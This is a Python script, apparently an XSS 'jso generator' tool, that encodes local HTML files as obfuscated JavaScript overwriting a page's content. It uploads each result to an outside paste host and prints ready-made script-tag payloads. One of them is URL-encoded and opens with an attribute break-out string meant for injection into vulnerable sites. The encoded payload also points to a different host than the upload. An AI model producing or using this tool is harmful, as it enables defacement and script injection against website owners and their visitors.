import os
import glob
import time
import requests
import subprocess
from colorama import init, Fore, Style
from pyfiglet import Figlet


init(autoreset=True)
custom_fig = Figlet(font='banner')


banner_text = Figlet(font='banner').renderText('Trhacknon')
banner_text = subprocess.check_output(('echo', banner_text)).decode()
banner_text = subprocess.check_output(('lolcat', '-f'), input=banner_text.encode()).decode()

banner_text1 = Figlet(font='slant').renderText('jso generator')
banner_text1 = subprocess.check_output(('echo', banner_text1)).decode()
banner_text1 = subprocess.check_output(('lolcat', '-f'), input=banner_text1.encode()).decode()

time_text = subprocess.check_output(['date', '+%D %T']).decode().rstrip()
time_text = subprocess.check_output(['toilet', '-f', 'term', '-F', 'border', '--gay', time_text]).decode()

print(banner_text)
print(banner_text1)
print(time_text)

html_files = glob.glob("*.html")

print(Fore.GREEN + "Les fichiers HTML suivants ont été trouvés :")
for file in html_files:
    print(Fore.CYAN + file)

selected_files = []
while True:
    print(Fore.MAGENTA + "Entrez le nom des fichiers que vous voulez convertir (séparés par des virgules) ou entrez 'q' pour quitter :")
    selected = input()
    if selected == 'q':
        break
    selected_files += selected.split(',')

for file in selected_files:
    if file.endswith('.html'):
        with open(file, 'r') as f:
            html_content = f.read()
            js_content = 'document.documentElement.innerHTML=String.fromCharCode(' + ', '.join(str(ord(c)) for c in html_content) + ')'
            js_file = file.replace('.html', '.js')
            with open(js_file, 'w') as j:
                j.write(js_content)

                print(Fore.GREEN + "Voulez-vous envoyer ce fichier sur l'API ? (Oui/Non)")
                response = input()
                if response.lower() == 'oui':
                    url = "https://hastebytrhacknon.trhacknon.repl.co/documents"
                    with open(js_file, 'r') as j:
                        data = j.read().encode()
                        r = requests.post(url, data=data)
                        key = r.json()["key"]

                        print(Fore.YELLOW + "L'URL de votre fichier JS est :")
                        print(Fore.BLUE + f'https://hastebytrhacknon.trhacknon.repl.co/raw/{key}')
                        print(Fore.YELLOW + "Le payload est :")
                        print(Fore.BLUE + f'<script type="text/javascript" src="https://hastebytrhacknon.trhacknon.repl.co/raw/{key}"></script>')
                        print(Fore.YELLOW + "Le payload encode est :")

                        print(Fore.BLUE + f'{" "*15}%22%3E%3Cscript%20type=%22text/javascript%22%20src=%22https://hastebin.com/raw/{key}%22%3E%3C%2Fscript%3E')

